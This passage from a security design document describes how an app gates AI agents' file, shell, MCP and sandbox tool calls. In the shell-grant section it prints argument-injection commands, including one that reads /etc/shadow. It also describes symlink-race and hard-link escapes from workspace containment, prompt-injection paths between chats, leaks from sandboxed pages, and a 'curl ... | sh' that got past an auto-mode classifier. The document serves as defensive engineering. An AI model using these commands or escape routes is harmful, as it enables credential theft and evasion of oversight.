tool call goes through. Read its module comment before touching that code —
it states its own guarantee precisely: *"resolving this path string right
now, following every symlink, does it land inside the workspace?"* — a
statement about a path at a moment, not about the file a caller subsequently
opens. Two things defeat that in between, and a model with `run_command` can
reach both:

- **Hard links** are not a race and not detectable by `containPath` at all —
  a hard link *is* the file under a second name, so `realpath` on an
  in-workspace entry correctly resolves to itself even when it names an
  outside file. Demonstrated end to end through the shipped tools: read a
  file outside the workspace, then overwrite it. The mitigation lives at the
  call site, not here: `packages/tools/src/fs-tools.ts`'s `openVerified`
  refuses any opened handle reporting `nlink > 1`. That refusal is blunt (it
  also refuses legitimately hard-linked files) and accepted as such — a
  false refusal is recoverable, a false accept is not. It's also not
  complete: a filesystem that doesn't report link counts (some network
  mounts) reports 1 and the check silently passes, narrowing the attack to
  volumes where Node can see link counts rather than eliminating it.
- **TOCTOU** — a directory component gets swapped for a junction pointing
  outside the workspace between the containment check and the tool actually
  using the path. Not theoretical: an unprivileged worker-thread racer,
  toggling that swap as fast as the OS allows while the main thread hammers
  the tool in a loop, reproduced it live against the *previous* version of
  these tools — `read_file` leaked attacker content 20 times in 15,981
  attempts, `list_dir` enumerated an outside directory 977 times in 39,993
  (~2.4% per attempt), and a separate run landed 184 `write_file` writes on
  an outside file. The current mitigation (`openVerified`/`readdirVerified`
  bracketing every step from the first identity check through the open/read
  and a second containment verdict) closes the sub-window the old code
  actually left open. Re-run under the same live racer today: `read_file`'s
  regression test asserts zero leaks per attempt across a non-vacuous run
  (swaps > 0, attempts > 100); `list_dir`'s asserts a leak rate under 0.5% —
  explicitly a narrowing, not a fix, per that test's own name; `write_file`'s
  is weaker evidence by design (it checks the outside file's final content
  once, not per attempt, so a pass there means "no corruption observed this
  run," not a percentage claim — see that test's own comment for why). The
  residual, stated in `fs-tools.ts`'s own module comment: an attacker who can
  land four precisely-timed toggles (outside file visible at the first
  check, clean at containment, outside again through the open, clean again
  at the final containment verdict) is still not stopped, and directory
  listings (`list_dir`, and the glob side of `search_files`) hold no file
  handle at all — Node exposes no fd-based `readdir` — so a swap that lands
  and reverts entirely inside one `readdir` call is undetectable by
  construction, not just unlikely. Read `paths.ts` and `fs-tools.ts` directly
  for the exact bracketing and the exact residual; both are documented
  in-module, and the in-module version is the one that stays in sync with
  the code as it keeps changing — this section already lagged it once.

**Extra folders widen containment, not past it.** A chat (and its project)
can name up to 10 other folders, each read-only or read & write
(`chat.folders`, `project.folders`; schema 15). File tools go through
`containPathIn`, which checks the workspace and each folder with the same
`containPath` and lets the innermost root decide, so a read-only folder
inside a writable one stays read-only. A write into a read-only folder is
refused before any card (PermissionBroker for the API tools, the PreToolUse
gate for Claude Code, and again in fs-tools). Claude Code is deliberately not
given the folders as `additionalDirectories`, which would load the skills and
commands under each one's `.claude`; only the workspace's config loads. It
reaches them anyway once the gate allows a call, in default and auto mode
(live probe, `packages/engine-claude-code/test/fixtures/README.md`), and the
system prompt names them. Shell commands are not path-contained, so read-only
binds file tools only; shell approval is still the control. A folder missing
on the machine running the reply is left out of that turn.

**The viewer reads chat folders the same way the file tools do** (Deck #826).
Every path goes through `containPathIn` and fs-tools' `openVerified` /
`readdirVerified`, on this machine only; on Windows a path with `:` after the
drive (a hidden stream) or a segment ending in `.` or a space is refused,
since Windows would open a different file from the one named. Text comes
through the authed API (first 2 MB, binary refused). What the browser loads
itself comes through `/view/<id>/<name>` links: 128 random bits, 10 minutes
from last use (so an open page's late loads still work) but never past an
hour from when it was made (a sandboxed page can reach the web and could
hand its link on, so use can't keep one alive for good), server memory only, no token (the id is the capability), containment checked
again on every request, and the link dies as soon as its folder stops being
the chat's or the chat is deleted. Making a link needs a JSON request, so a
cross-site form can't. The served type is from a fixed list with `nosniff`;
everything but PDF gets the sandbox CSP (opaque origin, network https/wss
only), and HTML iframes are `sandbox="allow-scripts allow-forms"`. PDF is the
exception (Chromium won't show one sandboxed): it can't script the page, but
it isn't sandboxed either. Websites open in a `site-<n>` window that no
capability matches. Every app command needs an `allow-<command>` permission
(`build.rs` declares the app manifest), granted only to the main and quick
windows, so a site window can call none, even one showing a page Tauri counts
as local (the dev server's). Show in folder reveals and never opens. A
viewed Markdown file's relative links and images resolve from its own
folder; each image gets its own `/view/` link (`ViewerImage`), so it goes
through the same containment. A path Windows would read as another file is
refused on every platform, not only on Windows. None of it is on the peer
listener.

**Artifacts run through one executor and the viewer's sandbox** (Deck #896).
The model makes them with the `artifact` tool. For API engines it's a Grunt
tool with source `artifact`. For Claude Code it comes from an in-process SDK
MCP server bound to the running reply, named `grunt_<16 hex>` afresh for each
process: the gate passes only that exact tool name, as source `artifact`. A
fixed name could be taken by a repo's `.mcp.json`, and its tool would get the
same pass, so a server called `grunt` is just another MCP server with cards.
Calls go through the broker and the audit but never get a card.
`toolPolicy.artifacts: false` refuses them, and Claude Code then gets no
server at all; the switch is part of the live process key. A model whose
row says it can't use tools isn't sent the tool, since artifacts are on by
default. The system prompt only carries the fixed guidance; the branch's
artifacts are a note added to the user's message in the request (never
stored), so the system prompt stays the same as artifacts change and Claude
Code keeps its live process and every engine its prompt cache. Titles and
languages reach the model that way, so a title is one line (the tool and
your edits alike) and a language is a short token, and the note flattens and
quotes both. Sync refuses artifact rows from another machine that Grunt
couldn't have made (a bad id, kind, language or maker, a title over one line,
a number below 1, content over 1 MB). Versions never change and follow the branch (the newest whose
reply is on it); a reply on another branch that creates an existing id gets
that branch's first version of the same artifact. Each version has its own
kind and language (schema 17): a rewrite can make a note into a page, so how
a version renders, what type it's served as and its file name all follow the
version, never the artifact. `message_id` isn't a foreign key, so a synced
version can arrive before its reply; a tie in version numbers (made on both
machines before they synced) goes to the later, then the larger id. Web pages and Mermaid diagrams are served from
the database through `/view/` links in the sandbox (Mermaid is Grunt's own
copy, bundled into `assets/`, in strict mode, with the source HTML-escaped);
SVG only as an image; Markdown through React and code through highlight.js.
Edit and Save to workspace are JSON-only. Saving goes through `containPathIn`
and `openVerified`, refuses read-only folders, writes before it truncates,
and replaces a file only when asked (a file another program makes between
the check and the open gets the same question). A code artifact's file
extension comes from a fixed list of languages, else `.txt`, so a download
is never a `.bat` or `.hta`. The web must never import
`@grunt/core/domain/artifacts.js`: it pulls in `node:crypto`. Schemas 16 and 17.

Office artifacts (`document` Markdown, `spreadsheet` and `presentation`
JSON) are checked by `core/domain/office-spec.ts` when the tool or your edit
stores them, and checked again when the file is made, since a synced version
was never checked. A document is bounded too: 120,000 characters, 6,000
lines, tables of 1,000 rows and 10,000 cells, indents of 24 columns, quotes 8
deep and 10,000 formatting marks outside code. The checks are early, clear
errors for the model; they aren't what keeps a hostile document harmless. The
.docx/.xlsx/.pptx is made only on Download (`GET
…/versions/:versionId/file`: `application/octet-stream`, `attachment`,
`nosniff`, `default-src 'none'; sandbox`) or Save to workspace (unchanged
containment and `openVerified`), and always in a `worker_threads` Worker
(`office/render.ts`, `render-worker.ts`): 512 MB of heap, a 20 s wall-clock
limit, at most two at once, and any failure (a writer's, the limit's, running
out of memory) is a 422 with a message. The bundle has a second entry for it,
`dist-bundle/server/render-worker.js`, which must sit beside `cli.js`. No
writer is given a path or URL to fetch: no images, no pptx links or media,
docx links only for http, https and mailto, which are text in the file.
Formulas are an allowlist, not a denylist: only Excel's built-in worksheet
functions (about 500, each with the file prefix Excel wants, `_xlfn.` or
`_xlfn._xlws.`) pass a fail-closed tokenizer, and WEBSERVICE, FILTERXML,
IMAGE, HYPERLINK, RTD, CALL, REGISTER, REGISTER.ID, EXEC, STOCKHISTORY,
TRANSLATE, DETECTLANGUAGE, COPILOT, INFO, CELL and INDIRECT are named and
refused. Bare names, `[` (other workbooks, tables), `|` (DDE), 3-D
references, control characters, `@` and the `#` spill operator are refused;
LET, LAMBDA, its helpers, GROUPBY and PIVOTBY aren't supported in phase 1.
The text that is checked is the text that is written: `formulaForFile` gives
the exact `<f>` content, and the renderer rewrites each `<f>` from it because
the library alters some characters (the .xlsx test reads it back and compares).
Formulas aren't calculated by Grunt; the workbook asks Excel to calculate on
open. An attached file's text is the user's, fenced, and may carry
instructions the model follows: the approval gate is unchanged.

**Live artifacts can read MCP data while a page is open** (spec
2026-10-12-live-artifacts, Deck #929; schema 24, see "Live artifacts" below).
An html artifact may declare up to 10 calls to read-only MCP tools
(`readOnlyHint: true`; a tool that declares nothing is refused), with only
enum and bounded-integer parameters. You allow them once in the viewer, and
each approval is a `chat` grant with a `live` constraint bound to the call's
declaration hash, the MCP server's id, the chat's profile and this machine.
Changing a call's args asks again, and a model rewrite that leaves the calls alone doesn't. Only
`PermissionBroker.grantLive` makes those grants, `resolve()` refuses one, an
ordinary call never matches one, and the broker's live branch never asks and
never takes the ask-on-mutate read pass. The page has an opaque origin and no
token. It posts to the app frame, which checks the message came from that
frame, and the server builds every argument from the stored declaration. Live
pages are served with no network at all (`default-src 'none'`, `connect-src`,
`frame-src`, `child-src`, `worker-src`, `object-src` and `manifest-src` all
`'none'`, no `'unsafe-eval'`, `form-action 'none'`, DNS prefetch off). What
that can't stop: the page navigating its own frame with data in the address,
WebRTC to a STUN or TURN host, and DNS lookups that slip past the prefetch
header. The viewer closes a page that navigates once the new document loads,
but that guard is a best-effort notice for navigations that commit, not a
wall: the request has gone by then, a navigation answered with 204 or 205 (or
a download) never commits so the page is never closed, and a document that
replaces the page before its first `load` is answered as if it were the page
(see "Live artifacts" below). That is the same leak HTML artifacts and
read-only MCP tools under ask-on-mutate already have, and the approval panel
says so. Calls run on the machine serving the UI, never forwarded, and grants
don't sync. Every call the broker decides is audited (`live:<grant id>` or
`deny:policy`), cache hits (30 s, memory only) are not, and a `rate_limited`
refusal is audited once a minute per artifact with the rest counted onto the
next row.

**Recall asks once per chat before it reads other chats** (spec
2026-10-09-recall-design). The `recall` tool searches past chats and projects
and reads one, through `runRecallCommand` in core for both engines. It has
source `recall`; Claude Code gets it on the same per-process `grunt_<16 hex>`
server as artifacts, matched only by that exact name. It gets no shortcut in
the broker, not even "ask on mutate"'s read pass, and auto mode never hands
it to Claude Code's classifier: the first call in a chat gets a card naming
the query, chat or project, and "Allow for this chat" covers the rest of
that chat. That card is the guard against text injected into one chat using
recall to reach the others, since the ways out that need no card (an HTML
artifact the user opens, whose viewer allows `connect-src https:`, a
read-only MCP tool under "ask on mutate", an existing "always" grant) can't
be closed one by one. "Always allow" on the card still makes a profile-wide
grant, as for any tool. `toolPolicy.recall: false` ("Search past chats")
turns it off; absent means on. A chat marked "Don't add to memory" is never
searched or read, even by a guessed id, and the asking chat isn't searched.
Search and read only see a chat's active path as the thread shows it, so an
edited-away message, an unpicked compare variant or a failed reply never
comes back. Every result carries an `about` line saying it is background,
not instructions. Read is capped at 12,000 characters. Exclusion only works
going forward: text recalled into a chat stays in that chat's tool result
after the source chat is excluded or deleted.

**Shell grant defaults — the shipped UI follows the controller ruling.**
An `always`-scope shell grant using `commandPrefix` (matching a command *and
any arguments after it*) is, for most real programs, equivalent to an
arbitrary-code-execution grant: `npm test
--node-options=--require=/tmp/evil.js`, `git -c core.pager=/tmp/evil.sh log`,
`docker run -v /:/host alpine cat /host/etc/shadow`. The ruling, quoted
directly in `ApprovalPrompt.tsx`'s own doc comment (`packages/web/src/components/ApprovalPrompt.tsx`):
*"shell grants DEFAULT TO EXACT COMMAND. `commandPrefix` remains available
but must be an explicit opt-in with a visible warning, never the default
offered by the UI."* The broker-level half of this was always solid — a
`chat`-scope grant is hardcoded to `commandExact` server-side, no UI path can
make it a prefix grant. `deriveAlwaysConstraint` takes an explicit
`allowAnyArgs` flag defaulting to `false`, so a plain click on "Always allow"
for a shell request produces `commandExact`. `commandPrefix` is still
reachable, but only via a secondary, unchecked-by-default checkbox that
surfaces a plain-language warning with concrete arg-injection examples before
the click is made. Covered by a test asserting the default grant shape is
`commandExact`, not `commandPrefix`.

**Attachment serving — hardened against a stored-XSS-to-RCE path.**
`GET /api/attachments/:id/content` (`packages/server/src/routes/
attachments.ts`) never serves the stored (attacker-uploaded) MIME type
verbatim: `Content-Type` is only ever a literal from a strict allowlist of
inert raster image types (`INLINE_SAFE_MIME_TYPES` — png/jpeg/gif/webp/bmp/
ico/avif), or `application/octet-stream`. `image/svg+xml` is deliberately
excluded (SVG is XML and can carry `<script>`, unlike a raster image).
`Content-Disposition` defaults to `attachment` and is `inline` only for that
same allowlist; `X-Content-Type-Options: nosniff` and a restrictive
`Content-Security-Policy: default-src 'none'; sandbox` are defence in depth.
The filename goes through a `contentDisposition()` helper that strips
control characters, neutralises `"`/`\` in the legacy quoted fallback, and
carries the exact original name via RFC 5987 `filename*=UTF-8''...`. On the
client, the image-preview gate (`Composer.tsx`/`Message.tsx` via
`AttachmentChip`) uses `api.attachments.previewable(mime)`, a matching
raster-only allowlist, instead of a bare `mime.startsWith('image/')` check.
This was a real path from "uploaded a file" to "ran a command on the
machine," not an alert box in a sandboxed viewer: this origin also hosts the
API that runs shell commands and holds the bearer token.

**Other sites can't write to the API** (Deck #897). Browser mode (`grunt
serve` with no token) had no defence against a page on another site posting
a hidden `text/plain` form to `/api/...`: every write route reads its body as
JSON whatever its type, so a form could create a connection or a profile.
`cross-site.ts` refuses a POST, PUT, PATCH or DELETE under `/api` with 403
unless the browser marks it `Sec-Fetch-Site: same-origin` (which a page
can't set; `npm run dev` through Vite's proxy passes this way), or its
`Origin` is the server's own or one of the desktop webview's
`--cors-origin`s, or it carries neither header (curl, scripts, tests). An
opaque `null` origin is refused. So is any write a browser marks as
anything but fetch (`Sec-Fetch-Dest` other than `empty`, or
`Sec-Fetch-Mode: navigate`: a form, a page load, a plugin such as a PDF
viewer), even from the server's own origin: Grunt's UI only writes with
fetch, and PDFs are served from that origin unsandboxed. Not the Referer:
`/view/` pages send none. Reads aren't checked, since CORS already
stops another site reading them. It runs in every mode, behind the Host
check, so the desktop's token is no longer the only defence.

**Importing from claude.ai reads a folder the client names** (spec
2026-10-09-claude-import-design). `POST /api/import/claude` and its preview
take an absolute folder path, as a chat's workspace does, behind the same
token, Host and cross-site checks as every other write. Only files whose
names match the export's parts are read (`conversations.json`,
`projects/*.json`, `memories/*.json`, `artifacts/<id>/...`), from files or
from ZIPs named as the export's are (`conversations-000.zip` and the like;
any other ZIP in the folder is left alone). Every path is checked with
`containPath`, so a link is only followed when it leads somewhere inside
the folder, a file over 512 MiB or a ZIP of 2 GiB is refused, and the parts
read may add up to 2 GiB and 50,000 at most. ZIPs are read in memory by a small reader
(`packages/server/src/import/zip.ts`) that refuses ZIP64, encryption and
anything but stored or deflated entries, never inflates past an entry's
stated size and checks every CRC. Entry names are only compared, never used
as paths, so a hostile archive can't write anywhere. What the import writes
goes under `<db>.imported/claude/` through `containPath`, with names made
safe by `safeFileName`. The export's content is treated as untrusted:
claude.ai's memory notes are fenced as `<claude-notes>` in the condensing
prompts with the summariser's rules (no instructions, commands or URLs
copied in). The learned note and project notes are checked the same way as
a summariser update before they are saved, and both reach chats fenced as
untrusted background. About you can't be fenced (it is the user's own
words, which the model follows), so the import only drafts it: the user
reads it in the report and saves it, or doesn't. Cowork is read from the
folder Claude Desktop keeps on this machine (or `GRUNT_COWORK_ROOT`) and
from the folder chosen for the import, the same one the export is read
from; the search under it is capped at five folders deep and 2,000 folders,
session and transcript ids that could make a path are refused, every path
goes through `containPath`, and transcripts are capped at 512 MiB each and
2 GiB for each folder read.

**Scheduled runs act with nobody watching.** What still runs unattended is
exactly what needs no card: existing Always grants (exact host-shell commands
included), read-only tools and read-only MCP tools under "Ask on changes",
artifacts, web tools a profile allows and sandboxed commands (under "Ask on
changes"; a host off the sandbox's list is refused, never asked, unless a host grant already covers it). A prompt
injection in a scheduled run is limited to those, and a sandboxed command can
still push data to a host on the allowlist (see the sandbox's known limits). The editor's warnings list what will be refused, not what will run.
There's no spend cap; usage rows are written as normal.

**Sub-agents never widen what a reply can do.** A sub-agent's tools are what both its parent's policy and its chosen profile's policy allow (never wider than either), every one of its tool calls goes through the same broker, cards, grants and audit as the parent's, and it can't start another sub-agent or make artifacts. Grants are matched and stored under the parent reply's own profile, not the profile the sub-agent runs as, so a careful parent (always ask, no grants) can't borrow another profile's grants by running a sub-agent as it. Its answer is model-written text the parent reads like any other tool result, so text it read (a web page, a file) can reach the parent's context the same way a tool result always could.

### Claude Code engine

- Live processes (`engine-claude-code/src/live.ts`). A reply's Claude Code
  process stays alive afterwards, input open, and the session's next message
  is pushed into it instead of starting a process and resuming from disk:
  measured on Haiku, the first word of a follow-up comes in about 1.7 s
  instead of about 4 s. A process is reused only when the session planner
  continues its session in place (the message being answered is the
  session's tip) and the options it started with still match -- folder,
  model, backend and credentials, tool policy, Auto, system prompt (which
  carries project memory), thinking budget. Anything else starts a new
  process that resumes the session, closing the old one. Stopping a reply,
  or a reply ending in an error, closes its process. Idle processes close
  after 30 minutes and at most 3 are kept (each runs its own MCP servers);
  `container.close()` stops them all. Hooks are fixed when a process starts,
  so they call through a per-reply binding; a tool call with no reply
  running is refused.
- Claude Code executes its own tools; Grunt gates them. A PreToolUse hook
  (matcher `*`) sends every call through `GruntToolProvider.requestApproval`
  -> `PermissionBroker` (`source: 'agent'`), ahead of any allow-rules in the
  user's Claude settings. `canUseTool` uses the same gate as a fallback;
  `permissionMode` is `'default'` unless the chat's Auto toggle is on (next
  bullet).
- Auto mode (per chat: Composer **Auto** toggle, `chat.auto_mode`, applies
  from the next turn). On the Claude login, turns run with
  `permissionMode: 'auto'`. The hook still sends every call through
  `requestApproval` -> `PermissionBroker` first, so policy denials,
  outside-workspace denials, auto-read and grants behave exactly as before.
  Only a call the broker would *ask* about goes to Claude Code's classifier
  instead of a card (audited `auto`), and never a write to Claude Code config
  or an unrecognised tool: those still get a card (`isDeferrableInAutoMode`).
  `canUseTool` never defers, so a call the classifier can't decide gets a
  card (unverified live -- see Known gaps). Classifier blocks are audited
  `deny:auto` from a `PermissionDenied` hook (unverified live -- see Known
  gaps). Endpoint backends and utility calls ignore the toggle; if Claude Code
  doesn't start in auto mode the turn fails with a capability error.
- Hand-off mechanics (Task 1 probe): the hook hands a deferred call over by
  returning `{}` (no decision). Returning `permissionDecision: 'defer'` does
  not reach the classifier; it pauses the turn (`terminal_reason:
  'tool_deferred'`). In auto mode the hook's no-decision result lets
  allow-rules from user, project or local Claude settings (including the
  workspace's own `.claude/settings.json`) decide before the classifier, so
  an `auto` audit row means "handed off", not "classifier approved".
- Unavailable auto mode is silent: Claude Code starts with init
  `permissionMode: 'default'` and no error (models that report no auto
  support, e.g. haiku on this account, or `disableAutoMode`). The engine detects it because init reports
  `permissionMode: 'default'`, and fails the turn
  with a capability error ("Auto mode isn't available for this account or
  model. Turn it off to continue."). Use a model whose `supportsAutoMode` is
  true (sonnet here).
- File-tool paths are checked with `containPathIn` (the workspace and the
  chat's extra folders); anywhere else, or a write into a read-only folder, is
  denied without a card. The agent shell tools (Bash, BashOutput, KillShell,
  PowerShell, Monitor) are not path-contained; their grants are pinned to the
  exact command like `run_command`.
- Agent file paths are trimmed, `~` paths are refused, on Windows `/c/...`
  paths are refused (Claude Code reads them as `C:\...`, `containPath` would
  not), and Glob/Grep patterns with absolute, `~` or `..` prefixes are
  contained.
- Writes to Claude Code's own config always get a card (R13): anything under a
  `.claude` directory, `.mcp.json`, and `CLAUDE.md`/`CLAUDE.local.md` in any
  directory (`isProtectedAgentPath`). No grant covers them and a chat/always
  answer stores none, because a hook, skill or MCP command written there would
  run on a later turn with no Bash card.
- Skill and slash-command inline shell (`` !`cmd` ``) is disabled for Grunt
  turns (R14, `disableSkillShellExecution` in the SDK's flag settings), since
  the Skill tool itself gets no card.
- With `agentMcp: false` the turn loads no MCP servers (`strictMcpConfig`);
  the gate also denies MCP calls.
- Unknown Claude Code tools can only be approved once (no chat/always grants).
- The child env has `ANTHROPIC_API_KEY`/`ANTHROPIC_AUTH_TOKEN` removed for the
  Claude backend, and `CLAUDECODE`/`CLAUDE_CODE_ENTRYPOINT`/
  `CLAUDE_CODE_SSE_PORT` removed for every backend (any case).
- Session ids live in `message.engine_meta`. A turn continues the session in
  place only when the message above it is still that session's tip; anything
  else (retry, edit, compare siblings, another model's turn) starts a fresh
  session seeded with the branch's own history. There is no fork: a fork
  copies the whole session, including other branches' turns (R12). See
  `packages/engine-claude-code/src/session.ts`.

Known gaps:

- The workspace's own Claude Code project config -- `.claude/settings.json`
  and `settings.local.json` (hooks, permissions), `.claude/skills`, commands
  and agents, `.mcp.json`, CLAUDE.md -- applies with no trust prompt, as
  `settingSources` includes `project` and `local`. Hooks run commands without
  a Grunt card. Only open folders you trust as workspaces. (A chat's extra
  folders load none of theirs; see "Extra folders" above.)

- Relative paths are resolved against the workspace root for grants and card
  summaries, but Claude Code resolves them against its own current directory,
  which a Bash `cd` can move inside the workspace. A card or a path grant can
  therefore name a different file than the one touched (containment still
  holds).
- Claude Code does its own file I/O, so fs-tools' hard-link and swap
  protections don't apply to agent tools. A model allowed to run shell
  commands could hard-link an outside file into the workspace and then read it
  (auto-allowed under `ask_on_mutate`). Shell approval is the control.
- In auto mode the audit records the hand-off (`auto`), not the classifier's
  verdict: a call the classifier allowed has no further row, only blocks do
  (`deny:auto`). A deferred call the classifier couldn't decide gets a second
  row when its card is answered.
- Q4 (Task 1): `canUseTool` was never reached when the classifier couldn't
  decide; in every probe run `canUseToolCalls` was empty and the turn ended
  `completed` with no classifier blocks observed, so that fallback is
  unverified live.
- The classifier is not a security boundary for Grunt. A `curl ... | sh` ran
  under auto mode in testing (Task 1 probe against a .invalid host; Task 11
  against a refused 127.0.0.1 port); it was allowed by the classifier or by the
  user's own settings allow-rules, which can't be told apart. No classifier
  block has been observed in testing (the only block seen, a force-push in
  Task 1, came from the user's own git-guard hook). Some of Grunt's limits
  still apply in auto mode: tool policy, workspace containment for file
  tools, and the card for Edit/Write/MultiEdit/NotebookEdit calls that touch
  Claude Code config (live check: a write to `.claude/settings.local.json`
  raised a card, denied). Shell tools are different: in auto mode
  Bash/PowerShell are not path-contained and are decided by the classifier
  (or a settings allow-rule) without a Grunt card. That includes commands
  that could write `.claude/settings.local.json` or touch files outside the
  workspace. Turn shell off in the profile if that isn't acceptable.
- Unverified live: the `PermissionDenied` hook and its `deny:auto` audit row
  (no classifier block was ever observed, Task 1 or Task 11), and
  `canUseTool` on an undecided call. Both are covered by unit tests only.

### Clean chats, relayed MCP and the Claude Desktop import

These follow spec 2026-10-11-claude-code-clean-chat-and-mcp-design. They replace two lines of the Claude Code engine spec: the non-goal "Passing Grunt's own fs/shell/MCP tools into Claude Code" (for MCP), and "`mcpServerIds` is ignored for Claude Code profiles".

- **Clean chats.** A Claude Code chat with no workspace folder is no longer refused. It runs as a clean chat.
  - **Where it runs.** Its own scratch folder, `<data dir>/claude-scratch/<chat id>`, which is the same folder every turn so the session resumes. With `--db :memory:` it is a private temp folder.
  - **What it loads.** `settingSources: []` and `strictMcpConfig: true`: none of the user's Claude Code settings, CLAUDE.md, skills, hooks or MCP config.
  - **Built-in tools.** Only `WebSearch` and `WebFetch` (`tools`), or none when the profile turns web off.
  - **System prompt.** The profile's composed prompt as a plain string, with no coding-agent preset.
  - **Approvals.** The gate and broker still see no workspace. Grunt's own tools (artifact, recall, relayed MCP) and agent `web` tools go on to the usual approval. File, shell and Claude Code's own `mcp__*` tools are refused, with "This chat has no folder: …".
  - **Adding a folder later.** The next turn starts a fresh session in that folder.
  - **Deleting a chat.** Its scratch folder is removed too.
- **Grunt's MCP servers in Claude Code chats.** Claude Code profiles now use the MCP checklist ("MCP servers (from Grunt)").
  - **How tools get there.** Grunt's per-process server (`grunt_<16 hex>`) carries one tool per tool of each allowlisted, connected server, in folder and clean chats alike. They come from `GruntToolProvider.relayMcpTools`: the same specs `listTools` builds, but ungated.
  - **Naming.** Claude Code calls them `mcp__grunt_<hex>__<server>__<tool>`, cut to 64 characters with a short hash when longer (`engine-claude-code/src/relay.ts`).
  - **Approval.** The gate approves each call with the very ToolSpec an API model would get (`source: 'mcp'`, its server id and hint risk). Grants, the read-only pass under "ask on mutate" and cards therefore behave the same, and only then does the server run the call through Grunt's own MCP connection.
  - **Reporting and restarts.** Calls are reported under the API name `mcp__<server>__<tool>`. A change to the relayed tools starts a new process.
  - **How the server is built.** It answers `tools/list` and `tools/call` itself on an MCP `McpServer` rather than through the SDK's zod-only `tool()` helper, so the tools keep their real JSON schemas. A live probe confirmed Claude Code uses a tool served this way, even with no settings and no built-in tools (`test/fixtures/raw-server-probe.mjs` and its README section).
  - **Claude Code's own MCP config.** The "MCP servers from your Claude Code config" switch still governs it, in folder chats only.
- **Import from Claude Desktop** (Settings > MCP servers).
  - **Reading the config.** `GET /api/mcp-servers/import/claude-desktop` reads Claude Desktop's config: `%APPDATA%\Claude\claude_desktop_config.json`, the macOS or Linux equivalent, or `GRUNT_CLAUDE_DESKTOP_CONFIG`. It lists the servers by name, command or URL, and the names of their env vars and headers.
  - **Importing.** `POST` with the chosen names re-reads the file and creates them through the same code as `POST /api/mcp-servers`, so values go straight into the secret store and never reach the browser.
  - **Skipped servers.** Existing names, SSE servers and malformed entries are skipped with a reason.
  - **Profiles.** Imported servers start enabled, and are turned on only for the profiles ticked under "Turn on for" (none by default). `POST` takes them as `profileIds`, refuses an unknown one with a 400 before creating anything, and returns the updated profiles.
- **Turning servers on from the Inspector.** The Inspector's "MCP servers" section lists every server with its health, and with the chat's profile loaded each has a box for whether that profile may use it. Ticking one saves the profile's `toolPolicy.mcpServerIds` (`PATCH /api/profiles/:id` with just that field), the same list as Settings > Profiles, so it applies to every chat on the profile from the next message. Servers the profile can't use are dimmed. In a compare chat the boxes follow the chat's main profile.
- **Gaps.**
  - Each Claude Code process gets its own relay, but the real servers run once in Grunt's manager, so a stateful server's state is shared between chats (as it already was for API profiles).
  - A relayed call's result isn't added to the audit trail; only its approval is ("delegated to Claude Code").
  - The import is one-off: changes to Claude Desktop's config later aren't followed.

### The sandbox (spec 2026-10-12-sandbox-design)

- **Policy.** `ToolPolicy.shellRuns` (`host` | `sandbox`, absent = host) and `sandboxHosts` (absent = `DEFAULT_SANDBOX_HOSTS`). The provider lists one `run_command` or the other, never both; the sandboxed one has source `sandbox`. Broker: `sandbox` is allowed with no card under ask on mutate (`grantedBy: 'sandbox'`) and asks under always ask (chat grants pinned to the exact command); `network` (`sandbox_network`) always asks, its grants pinned to one host; `shell` is denied when the shell runs in the sandbox, and so are Claude Code's Bash, PowerShell, BashOutput, KillShell and Monitor.
- **Backend.** `packages/sandbox`: `wsl.ts` runs everything as `wsl.exe -d grunt-sandbox -u <user> --exec ...` (never `--`, which mangles Windows paths); `mounts.ts` mounts only the folders of chats with a running agent, through the root-only `mount.sh`; `agent-pool.ts` keeps one agent per chat (15 minutes idle, at most 6, 30 s wait when all are busy); `agent-client.ts` runs one command at a time per chat so a network question always belongs to the command that is running; `setup.ts` creates or repairs the distro (Node v24.21.0 by SHA-256, the runtime by `npm ci` from a committed lockfile) and runs the self-test.
- **Network.** An allowlist plus cards. A host that isn't on the profile's list raises a `sandbox_network` card, but the broker refuses local, private, reserved and single-label hosts (`localhost`, `*.local`, `*.internal`, `*.home.arpa`, IP literals in those ranges) before any card is shown, so there is nothing to approve. That check only sees the name, so a second guard works on the resolved address at connect time: the runtime always denies loopback, link-local and cloud metadata addresses, and Grunt adds RFC 1918, CGNAT, ULA, multicast and the reserved ranges through the runtime's `deniedResolvedAddresses` (`agent-core.mjs`). Before a card is raised, the agent itself resolves the host (5 s at most) and answers no without asking when the name doesn't resolve or any of its addresses is one of those; that is an early refusal, the runtime's connect-time check is the enforcement. The result is that a LAN or intranet host can't be reached from the sandbox even when it is on the allowlist; a package mirror on the local network would need that changed deliberately. **Literal IPs are judged by Grunt only, never by the runtime:** the runtime's resolved-address guard skips a destination that is already an address, and lets an allowlisted literal straight through. So the allowlist never holds one: the routes refuse IP literals (v4, v6, bracketed, with or without a port) and `localhost`/`*.localhost` (`sandboxHostProblem`, in core), and `WslSandbox` drops any such entry again before every run, because a profile synced from a peer never went through the routes. A literal that isn't on the allowlist goes through the agent's ask-time lookup, which refuses a private one without a card (the live test dials 127.0.0.1, the VM's own address, 10.0.0.1 and 169.254.169.254 through the proxy and sees 403 for each).
- **Protected files and Windows' case-insensitive folders.** Windows folders in the VM are case-insensitive (drvfs; `case=force` would need a registry change, `DrvFsAllowForceCaseSensitivity`, and without it WSL falls back to `case=dir`, so it isn't used), while the runtime's read-only binds and its guards on dangerous files sit on one exact spelling. Found live in the final review: `.GIT/hooks/pre-commit`, `.Git/CONFIG`, `.BashRC`, `.VSCode/tasks.json` and `.Claude/settings.local.json` all landed on disk past the runtime, and `RO/x` landed in a read-only folder nested in a writable one. Three things close it. (1) A read-only folder inside a writable one of the same run (or the same folder) is refused (`bad_folder`, "... is read-only but sits inside the writable ..."); folders read-only because nothing writes them are a separate read-only bind, and in a command's view `/mnt` is a tmpfs holding only its own folders, so another spelling of those doesn't resolve at all. (2) The agent moves into the command's folder while the runtime wraps it (the runtime takes its guarded paths from its own `process.cwd()`) and also hands the runtime exact-spelling write denies for the protected paths of every writable folder and the home (the `.git` ones only when `.git` is a folder, as the runtime does, so `git init` still works). (3) The agent, outside the inner sandbox, copies the protected paths of each writable folder and the chat's home before every command and puts them back after it, whatever its outcome (done, timeout, cancel, failure, and on close): changed files get their old bytes, new files and folders go, deleted files come back; links are never followed (a protected path swapped for a link is removed, and nothing is written through it). The list is `PROTECTED_PATHS` in `agent-core.mjs`: `.git/hooks`, `.git/config`, `.gitmodules`, `.gitconfig`, shell rc and profile files, `.ripgreprc`, `.mcp.json`, `CLAUDE.md`, `CLAUDE.local.md`, `.vscode`, `.idea` (its top level), and Claude Code's `.claude/settings.json`, `settings.local.json`, `hooks`, `commands`, `agents` and `skills`. A changed file is removed and made afresh (exclusive create, no link followed), 